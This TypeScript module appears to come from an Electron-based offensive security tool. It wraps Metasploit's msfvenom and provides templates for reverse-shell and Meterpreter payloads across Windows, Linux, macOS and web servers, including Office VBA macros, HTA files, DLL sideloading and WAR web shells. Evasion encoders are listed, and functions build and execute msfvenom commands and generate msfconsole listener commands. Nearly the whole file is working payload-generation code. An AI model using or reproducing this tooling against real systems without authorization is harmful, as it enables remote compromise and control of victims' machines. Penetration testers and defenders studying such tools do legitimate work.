// Msfvenom Integration
// Generate Metasploit payloads

import {
    MsfvenomConfig,
    MsfvenomResult,
    MsfPayloadType,
    MsfFormat,
    MsfEncoder,
    PayloadTemplate
} from './types';

// Common payload templates
export const payloadTemplates: PayloadTemplate[] = [
    // Windows Meterpreter
    {
        id: 'win-meterpreter-tcp',
        name: 'Windows Meterpreter (Reverse TCP)',
        description: 'Windows x64 Meterpreter reverse TCP shell',
        category: 'meterpreter',
        platform: 'windows',
        config: {
            payload: 'windows/x64/meterpreter/reverse_tcp',
            format: 'exe',
            encoder: 'x64/xor'
        }
    },
    {
        id: 'win-meterpreter-https',
        name: 'Windows Meterpreter (Reverse HTTPS)',
        description: 'Windows x64 Meterpreter reverse HTTPS (encrypted)',
        category: 'meterpreter',
        platform: 'windows',
        config: {
            payload: 'windows/x64/meterpreter/reverse_https',
            format: 'exe'
        }
    },
    {
        id: 'win-meterpreter-stageless',
        name: 'Windows Meterpreter Stageless',
        description: 'Stageless Windows Meterpreter (larger but more reliable)',
        category: 'stageless',
        platform: 'windows',
        config: {
            payload: 'windows/x64/meterpreter_reverse_tcp',
            format: 'exe'
        }
    },
    {
        id: 'win-shell-tcp',
        name: 'Windows Shell (Reverse TCP)',
        description: 'Simple Windows command shell',
        category: 'reverse_shell',
        platform: 'windows',
        config: {
            payload: 'windows/x64/shell/reverse_tcp',
            format: 'exe'
        }
    },
    // Linux Meterpreter
    {
        id: 'linux-meterpreter-tcp',
        name: 'Linux Meterpreter (Reverse TCP)',
        description: 'Linux x64 Meterpreter reverse TCP shell',
        category: 'meterpreter',
        platform: 'linux',
        config: {
            payload: 'linux/x64/meterpreter/reverse_tcp',
            format: 'elf'
        }
    },
    {
        id: 'linux-shell-tcp',
        name: 'Linux Shell (Reverse TCP)',
        description: 'Simple Linux shell',
        category: 'reverse_shell',
        platform: 'linux',
        config: {
            payload: 'linux/x64/shell/reverse_tcp',
            format: 'elf'
        }
    },
    // Web Payloads
    {
        id: 'php-meterpreter',
        name: 'PHP Meterpreter',
        description: 'PHP Meterpreter for web servers',
        category: 'meterpreter',
        platform: 'web',
        config: {
            payload: 'php/meterpreter/reverse_tcp',
            format: 'raw'
        }
    },
    {
        id: 'jsp-shell',
        name: 'JSP Web Shell',
        description: 'JSP reverse shell for Java servers',
        category: 'web_shell',
        platform: 'web',
        config: {
            payload: 'java/jsp_shell_reverse_tcp',
            format: 'raw'
        }
    },
    {
        id: 'war-shell',
        name: 'WAR Web Shell',
        description: 'WAR file for Tomcat/JBoss deployment',
        category: 'web_shell',
        platform: 'web',
        config: {
            payload: 'java/jsp_shell_reverse_tcp',
            format: 'war'
        }
    },
    {
        id: 'asp-meterpreter',
        name: 'ASP Meterpreter',
        description: 'ASP Meterpreter for IIS servers',
        category: 'meterpreter',
        platform: 'web',
        config: {
            payload: 'windows/meterpreter/reverse_tcp',
            format: 'asp'
        }
    },
    {
        id: 'aspx-meterpreter',
        name: 'ASPX Meterpreter',
        description: 'ASPX Meterpreter for .NET IIS servers',
        category: 'meterpreter',
        platform: 'web',
        config: {
            payload: 'windows/meterpreter/reverse_tcp',
            format: 'aspx'
        }
    },
    // PowerShell
    {
        id: 'powershell-meterpreter',
        name: 'PowerShell Meterpreter',
        description: 'PowerShell based Meterpreter',
        category: 'meterpreter',
        platform: 'windows',
        config: {
            payload: 'windows/x64/meterpreter/reverse_tcp',
            format: 'psh'
        }
    },
    {
        id: 'powershell-cmd',
        name: 'PowerShell One-liner',
        description: 'PowerShell command for execution',
        category: 'reverse_shell',
        platform: 'windows',
        config: {
            payload: 'cmd/windows/reverse_powershell',
            format: 'raw'
        }
    },
    // Python
    {
        id: 'python-meterpreter',
        name: 'Python Meterpreter',
        description: 'Python Meterpreter script',
        category: 'meterpreter',
        platform: 'multi',
        config: {
            payload: 'python/meterpreter/reverse_tcp',
            format: 'raw'
        }
    },
    // Bash
    {
        id: 'bash-tcp',
        name: 'Bash Reverse Shell',
        description: 'Simple bash reverse shell',
        category: 'reverse_shell',
        platform: 'linux',
        config: {
            payload: 'cmd/unix/reverse_bash',
            format: 'raw'
        }
    },
    // macOS
    {
        id: 'macos-meterpreter',
        name: 'macOS Meterpreter',
        description: 'macOS x64 Meterpreter',
        category: 'meterpreter',
        platform: 'macos',
        config: {
            payload: 'osx/x64/meterpreter/reverse_tcp',
            format: 'macho'
        }
    },
    // DLL Injection
    {
        id: 'win-dll-meterpreter',
        name: 'Windows DLL Meterpreter',
        description: 'DLL for injection/sideloading',
        category: 'staged',
        platform: 'windows',
        config: {
            payload: 'windows/x64/meterpreter/reverse_tcp',
            format: 'dll'
        }
    },
    // VBA Macro
    {
        id: 'vba-meterpreter',
        name: 'VBA Macro Meterpreter',
        description: 'VBA macro for Office documents',
        category: 'staged',
        platform: 'windows',
        config: {
            payload: 'windows/meterpreter/reverse_tcp',
            format: 'vba'
        }
    },
    // HTA
    {
        id: 'hta-meterpreter',
        name: 'HTA Meterpreter',
        description: 'HTML Application payload',
        category: 'staged',
        platform: 'windows',
        config: {
            payload: 'windows/meterpreter/reverse_tcp',
            format: 'hta-psh' as MsfFormat
        }
    }
];

// Available encoders with descriptions
export const availableEncoders: Array<{ encoder: MsfEncoder | string; name: string; platform: string; rank: string }> = [
    { encoder: 'x86/shikata_ga_nai', name: 'Shikata Ga Nai', platform: 'x86', rank: 'excellent' },
    { encoder: 'x86/jmp_call_additive', name: 'JMP/CALL Additive', platform: 'x86', rank: 'normal' },
    { encoder: 'x86/call4_dword_xor', name: 'Call+4 DWORD XOR', platform: 'x86', rank: 'normal' },
    { encoder: 'x86/countdown', name: 'Countdown', platform: 'x86', rank: 'normal' },
    { encoder: 'x86/fnstenv_mov', name: 'fnstenv MOV', platform: 'x86', rank: 'normal' },
    { encoder: 'x64/xor', name: 'XOR Encoder', platform: 'x64', rank: 'normal' },
    { encoder: 'x64/xor_dynamic', name: 'Dynamic XOR', platform: 'x64', rank: 'normal' },
    { encoder: 'cmd/powershell_base64', name: 'PowerShell Base64', platform: 'cmd', rank: 'excellent' },
    { encoder: 'php/base64', name: 'PHP Base64', platform: 'php', rank: 'great' },
    { encoder: 'ruby/base64', name: 'Ruby Base64', platform: 'ruby', rank: 'great' }
];

// Available formats with descriptions
export const availableFormats: Array<{ format: MsfFormat; name: string; extension: string; platform: string }> = [
    { format: 'exe', name: 'Windows Executable', extension: '.exe', platform: 'windows' },
    { format: 'exe-small', name: 'Windows Executable (small)', extension: '.exe', platform: 'windows' },
    { format: 'dll', name: 'Windows DLL', extension: '.dll', platform: 'windows' },
    { format: 'msi', name: 'Windows MSI Installer', extension: '.msi', platform: 'windows' },
    { format: 'elf', name: 'Linux ELF Binary', extension: '', platform: 'linux' },
    { format: 'elf-so', name: 'Linux Shared Object', extension: '.so', platform: 'linux' },
    { format: 'macho', name: 'macOS Mach-O', extension: '', platform: 'macos' },
    { format: 'raw', name: 'Raw Shellcode', extension: '.bin', platform: 'multi' },
    { format: 'c', name: 'C Code', extension: '.c', platform: 'multi' },
    { format: 'csharp', name: 'C# Code', extension: '.cs', platform: 'windows' },
    { format: 'python', name: 'Python Script', extension: '.py', platform: 'multi' },
    { format: 'powershell', name: 'PowerShell Script', extension: '.ps1', platform: 'windows' },
    { format: 'psh', name: 'PowerShell One-liner', extension: '.ps1', platform: 'windows' },
    { format: 'psh-cmd', name: 'PowerShell Command', extension: '.bat', platform: 'windows' },
    { format: 'bash', name: 'Bash Script', extension: '.sh', platform: 'unix' },
    { format: 'perl', name: 'Perl Script', extension: '.pl', platform: 'multi' },
    { format: 'ruby', name: 'Ruby Script', extension: '.rb', platform: 'multi' },
    { format: 'php', name: 'PHP Script', extension: '.php', platform: 'web' },
    { format: 'asp', name: 'ASP Script', extension: '.asp', platform: 'windows' },
    { format: 'aspx', name: 'ASPX Script', extension: '.aspx', platform: 'windows' },
    { format: 'jsp', name: 'JSP Script', extension: '.jsp', platform: 'web' },
    { format: 'war', name: 'WAR Archive', extension: '.war', platform: 'web' },
    { format: 'vba', name: 'VBA Macro', extension: '.vba', platform: 'windows' },
    { format: 'vbs', name: 'VBScript', extension: '.vbs', platform: 'windows' },
    { format: 'hta', name: 'HTML Application', extension: '.hta', platform: 'windows' }
];

// Common payloads organized by platform
export const payloadsByPlatform: Record<string, Array<{ payload: MsfPayloadType | string; name: string; staged: boolean }>> = {
    windows: [
        { payload: 'windows/x64/meterpreter/reverse_tcp', name: 'x64 Meterpreter Reverse TCP', staged: true },
        { payload: 'windows/x64/meterpreter/reverse_https', name: 'x64 Meterpreter Reverse HTTPS', staged: true },
        { payload: 'windows/x64/meterpreter_reverse_tcp', name: 'x64 Meterpreter Stageless TCP', staged: false },
        { payload: 'windows/x64/shell/reverse_tcp', name: 'x64 Shell Reverse TCP', staged: true },
        { payload: 'windows/x64/shell_reverse_tcp', name: 'x64 Shell Stageless TCP', staged: false },
        { payload: 'windows/meterpreter/reverse_tcp', name: 'x86 Meterpreter Reverse TCP', staged: true },
        { payload: 'windows/meterpreter/reverse_https', name: 'x86 Meterpreter Reverse HTTPS', staged: true },
        { payload: 'windows/shell/reverse_tcp', name: 'x86 Shell Reverse TCP', staged: true }
    ],
    linux: [
        { payload: 'linux/x64/meterpreter/reverse_tcp', name: 'x64 Meterpreter Reverse TCP', staged: true },
        { payload: 'linux/x64/meterpreter_reverse_tcp', name: 'x64 Meterpreter Stageless TCP', staged: false },
        { payload: 'linux/x64/shell/reverse_tcp', name: 'x64 Shell Reverse TCP', staged: true },
        { payload: 'linux/x64/shell_reverse_tcp', name: 'x64 Shell Stageless TCP', staged: false },
        { payload: 'linux/x86/meterpreter/reverse_tcp', name: 'x86 Meterpreter Reverse TCP', staged: true },
        { payload: 'linux/x86/shell/reverse_tcp', name: 'x86 Shell Reverse TCP', staged: true }
    ],
    macos: [
        { payload: 'osx/x64/meterpreter/reverse_tcp', name: 'x64 Meterpreter Reverse TCP', staged: true },
        { payload: 'osx/x64/shell_reverse_tcp', name: 'x64 Shell Stageless TCP', staged: false }
    ],
    web: [
        { payload: 'php/meterpreter/reverse_tcp', name: 'PHP Meterpreter', staged: true },
        { payload: 'php/reverse_php', name: 'PHP Reverse Shell', staged: false },
        { payload: 'java/meterpreter/reverse_tcp', name: 'Java Meterpreter', staged: true },
        { payload: 'java/jsp_shell_reverse_tcp', name: 'JSP Shell', staged: false },
        { payload: 'python/meterpreter/reverse_tcp', name: 'Python Meterpreter', staged: true }
    ],
    cmd: [
        { payload: 'cmd/unix/reverse_bash', name: 'Bash Reverse Shell', staged: false },
        { payload: 'cmd/unix/reverse_python', name: 'Python Reverse Shell', staged: false },
        { payload: 'cmd/unix/reverse_netcat', name: 'Netcat Reverse Shell', staged: false },
        { payload: 'cmd/windows/reverse_powershell', name: 'PowerShell Reverse Shell', staged: false }
    ]
};

/**
 * Build msfvenom command from config
 */
export function buildMsfvenomCommand(config: MsfvenomConfig): string {
    const args: string[] = ['msfvenom'];

    // Payload
    args.push('-p', config.payload);

    // LHOST and LPORT
    args.push(`LHOST=${config.lhost}`);
    args.push(`LPORT=${config.lport}`);

    // Format
    args.push('-f', config.format);

    // Encoder (optional)
    if (config.encoder) {
        args.push('-e', config.encoder);
    }

    // Iterations (optional)
    if (config.iterations && config.iterations > 1) {
        args.push('-i', config.iterations.toString());
    }

    // Bad characters (optional)
    if (config.badchars) {
        args.push('-b', `"${config.badchars}"`);
    }

    // NOPs (optional)
    if (config.nops) {
        args.push('-n', config.nops.toString());
    }

    // Platform (optional)
    if (config.platform) {
        args.push('--platform', config.platform);
    }

    // Architecture (optional)
    if (config.arch) {
        args.push('-a', config.arch);
    }

    // Template (optional)
    if (config.template) {
        args.push('-x', config.template);
    }

    // Output file (optional)
    if (config.outputFile) {
        args.push('-o', config.outputFile);
    }

    return args.join(' ');
}

/**
 * Generate msfvenom payload (requires Electron/backend)
 */
export async function generateMsfvenomPayload(config: MsfvenomConfig): Promise<MsfvenomResult> {
    const command = buildMsfvenomCommand(config);

    // Check if running in Electron
    // @ts-ignore
    if (typeof window !== 'undefined' && window.ipcRenderer) {
        try {
            // @ts-ignore
            const result = await window.ipcRenderer.invoke('execute-command', { command });
            return {
                success: !result.error,
                command,
                output: result.stdout,
                error: result.error || result.stderr,
                payload: result.stdout
            };
        } catch (error: any) {
            return {
                success: false,
                command,
                error: error.message
            };
        }
    }

    // Return command for manual execution if not in Electron
    return {
        success: true,
        command,
        output: `Execute this command manually:\n\n${command}`
    };
}

/**
 * Generate handler commands for msfconsole
 */
export function generateHandlerCommands(config: MsfvenomConfig): string {
    return `use exploit/multi/handler
set PAYLOAD ${config.payload}
set LHOST ${config.lhost}
set LPORT ${config.lport}
exploit -j`;
}

/**
 * Get payload template by ID
 */
export function getPayloadTemplate(id: string): PayloadTemplate | undefined {
    return payloadTemplates.find(t => t.id === id);
}

/**
 * Get templates by category
 */
export function getTemplatesByCategory(category: PayloadTemplate['category']): PayloadTemplate[] {
    return payloadTemplates.filter(t => t.category === category);
}

/**
 * Get templates by platform
 */
export function getTemplatesByPlatform(platform: PayloadTemplate['platform']): PayloadTemplate[] {
    return payloadTemplates.filter(t => t.platform === platform);
}

/**
 * Validate msfvenom config
 */
export function validateConfig(config: Partial<MsfvenomConfig>): { valid: boolean; errors: string[] } {
    const errors: string[] = [];

    if (!config.payload) {
        errors.push('Payload is required');
    }

    if (!config.lhost) {
        errors.push('LHOST is required');
    } else if (!/^(\d{1,3}\.){3}\d{1,3}$|^[a-zA-Z0-9.-]+$/.test(config.lhost)) {
        errors.push('Invalid LHOST format');
    }

    if (!config.lport) {
        errors.push('LPORT is required');
    } else if (config.lport < 1 || config.lport > 65535) {
        errors.push('LPORT must be between 1 and 65535');
    }

    if (!config.format) {
        errors.push('Format is required');
    }

    return {
        valid: errors.length === 0,
        errors
    };
}

/**
 * Suggest format based on payload type
 */
export function suggestFormat(payload: string): MsfFormat {
    if (payload.startsWith('windows/')) {
        return 'exe';
    } else if (payload.startsWith('linux/')) {
        return 'elf';
    } else if (payload.startsWith('osx/')) {
        return 'macho';
    } else if (payload.startsWith('php/')) {
        return 'raw';
    } else if (payload.startsWith('java/')) {
        if (payload.includes('jsp')) {
            return 'jsp';
        }
        return 'jar' as MsfFormat;
    } else if (payload.startsWith('python/')) {
        return 'python';
    } else if (payload.startsWith('cmd/')) {
        return 'raw';
    }
    return 'raw';
}

/**
 * Get common bad characters for different scenarios
 */
export function getCommonBadChars(): Array<{ name: string; chars: string; description: string }> {
    return [
        { name: 'Null byte', chars: '\\x00', description: 'Null byte - breaks string operations' },
        { name: 'Newlines', chars: '\\x00\\x0a\\x0d', description: 'Null and newline characters' },
        { name: 'HTTP', chars: '\\x00\\x0a\\x0d\\x20', description: 'Common HTTP bad chars' },
        { name: 'Alphanumeric Only', chars: '\\x00-\\x2f\\x3a-\\x40\\x5b-\\x60\\x7b-\\xff', description: 'Only allow alphanumeric' },
        { name: 'Printable ASCII', chars: '\\x00-\\x1f\\x7f-\\xff', description: 'Only printable ASCII' }
    ];
}

export default {
    payloadTemplates,
    availableEncoders,
    availableFormats,
    payloadsByPlatform,
    buildMsfvenomCommand,
    generateMsfvenomPayload,
    generateHandlerCommands,
    getPayloadTemplate,
    getTemplatesByCategory,
    getTemplatesByPlatform,
    validateConfig,
    suggestFormat,
    getCommonBadChars
};
